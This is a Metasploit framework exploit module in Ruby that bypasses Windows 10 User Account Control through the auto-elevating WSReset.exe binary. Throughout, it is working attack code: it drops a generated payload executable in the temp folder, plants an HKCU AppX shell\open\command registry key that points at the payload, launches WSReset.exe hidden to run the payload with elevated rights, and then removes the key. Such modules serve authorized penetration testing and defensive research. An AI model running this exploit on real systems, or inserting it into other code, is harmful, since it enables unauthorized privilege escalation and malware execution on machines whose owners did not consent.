# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ManualRanking

  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
  include Post::Windows::Priv
  include Post::Windows::Runas

  def initialize(info = {})
    super(
      update_info(info,
        &#039;Name&#039;          => &#039;Windows 10 UAC Protection Bypass Via Windows Store (WSReset.exe) and Registry&#039;,
        &#039;Description&#039;   => %q(
        This module exploits a flaw in the WSReset.exe file associated with the Windows
        Store.  This binary has autoelevate privs, and it will run a binary file
        contained in a low-privilege registry location.  By placing a link to
        the binary in the registry location, WSReset.exe will launch the binary as
        a privileged user.
        ),
        &#039;License&#039;       => MSF_LICENSE,
        &#039;Author&#039;        => [
          &#039;ACTIVELabs&#039;,   # discovery
          &#039;sailay1996&#039;,   # poc
          &#039;bwatters-r7&#039;,  # metasploit module
        ],
        &#039;Platform&#039;      => [&#039;win&#039;],
        &#039;Targets&#039;       => [[ &#039;Automatic&#039;, {} ]],
        &#039;DefaultTarget&#039; => 0,
        &#039;DefaultOptions&#039; => {
          &#039;WfsDelay&#039;     => 15
        },
        &#039;DisclosureDate&#039;  => &#039;Feb 19 2019&#039;,
        &#039;Notes&#039;           =>
        {
          &#039;SideEffects&#039; => [ ARTIFACTS_ON_DISK, SCREEN_EFFECTS ]
        },
        &#039;References&#039;    => [
          [&#039;URL&#039;, &#039;https://www.activecyber.us/activelabs/windows-uac-bypass&#039;],
          [&#039;URL&#039;, &#039;https://heynowyouseeme.blogspot.com/2019/08/windows-10-lpe-uac-bypass-in-windows.html&#039;],
          [&#039;URL&#039;, &#039;https://github.com/sailay1996/UAC_bypass_windows_store&#039;],
        ]
      )
    )
    register_options(
      [OptString.new(&#039;PAYLOAD_NAME&#039;, [false, &#039;The filename to use for the payload binary (%RAND% by default).&#039;, nil])]
    )

  end

  def check
    if sysinfo[&#039;OS&#039;] =~ /Windows 10/ && is_uac_enabled? && exists?("C:\\Windows\\System32\\WSReset.exe")
      return CheckCode::Appears
    end

    CheckCode::Safe
  end

  def exploit
    check_permissions!
    case get_uac_level
    when UAC_PROMPT_CREDS_IF_SECURE_DESKTOP,
      UAC_PROMPT_CONSENT_IF_SECURE_DESKTOP,
      UAC_PROMPT_CREDS, UAC_PROMPT_CONSENT
      fail_with(Failure::NotVulnerable,
                "UAC is set to &#039;Always Notify&#039;. This module does not bypass this setting, exiting...")
    when UAC_DEFAULT
      print_good(&#039;UAC is set to Default&#039;)
      print_good(&#039;BypassUAC can bypass this setting, continuing...&#039;)
    when UAC_NO_PROMPT
      print_warning(&#039;UAC set to DoNotPrompt - using ShellExecute "runas" method instead&#039;)
      shell_execute_exe
      return
    end

    # get directory locations straight
    win_dir = session.sys.config.getenv(&#039;windir&#039;)
    vprint_status("win_dir = " + win_dir)
    tmp_dir = session.sys.config.getenv(&#039;tmp&#039;)
    vprint_status("tmp_dir = " + tmp_dir)
    exploit_dir = win_dir + "\\System32\\"
    vprint_status("exploit_dir = " + exploit_dir)
    reset_filepath = exploit_dir + "WSReset.exe"
    vprint_status("exploit_file = " + reset_filepath)

    # make payload
    payload_name = datastore[&#039;PAYLOAD_NAME&#039;] || Rex::Text.rand_text_alpha((rand(8) + 6)) + &#039;.exe&#039;
    payload_pathname = tmp_dir + &#039;\\&#039; + payload_name
    vprint_status("payload_pathname = " + payload_pathname)
    vprint_status("Making Payload")
    payload = generate_payload_exe
    reg_command = exploit_dir + "cmd.exe /c start #{payload_pathname}"
    vprint_status("reg_command = " + reg_command)
    registry_key = "HKCU\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command"


    # make registry changes
    vprint_status("Making Registry Changes")
    begin
      registry_createkey(registry_key)
      registry_setvaldata(registry_key, "DelegateExecute", &#039;&#039;, "REG_SZ")
      registry_setvaldata(registry_key, &#039;&#039;, reg_command, "REG_SZ")
    rescue ::Exception => e
      print_error(e.to_s)
    end
    vprint_status("Registry Changes Complete")
    # Upload payload
    vprint_status("Uploading Payload to #{payload_pathname}")
    write_file(payload_pathname, payload)
    vprint_status("Payload Upload Complete")

    vprint_status("Launching " + reset_filepath)
    begin
      session.sys.process.execute("cmd.exe /c \"#{reset_filepath}\"", nil, &#039;Hidden&#039; => true)
    rescue ::Exception => e
      print_error(e.to_s)
    end
    print_warning("This exploit requires manual cleanup of &#039;#{payload_pathname}!")
    # wait for a few seconds before cleaning up
    sleep(20)
    vprint_status("Removing Registry Changes")
    registry_deletekey(registry_key)
    vprint_status("Registry Changes Removed")
  end

  def check_permissions!
    unless check == Exploit::CheckCode::Appears
      fail_with(Failure::NotVulnerable, "Target is not vulnerable.")
    end
    fail_with(Failure::None, &#039;Already in elevated state&#039;) if is_admin? || is_system?
    # Check if you are an admin
    # is_in_admin_group can be nil, true, or false
    print_status(&#039;UAC is Enabled, checking level...&#039;)
    vprint_status(&#039;Checking admin status...&#039;)
    admin_group = is_in_admin_group?
    if admin_group.nil?
      print_error(&#039;Either whoami is not there or failed to execute&#039;)
      print_error(&#039;Continuing under assumption you already checked...&#039;)
    else
      if admin_group
        print_good(&#039;Part of Administrators group! Continuing...&#039;)
      else
        fail_with(Failure::NoAccess, &#039;Not in admins group, cannot escalate with this module&#039;)
      end
    end

    if get_integrity_level == INTEGRITY_LEVEL_SID[:low]
      fail_with(Failure::NoAccess, &#039;Cannot BypassUAC from Low Integrity Level&#039;)
    end
  end
end

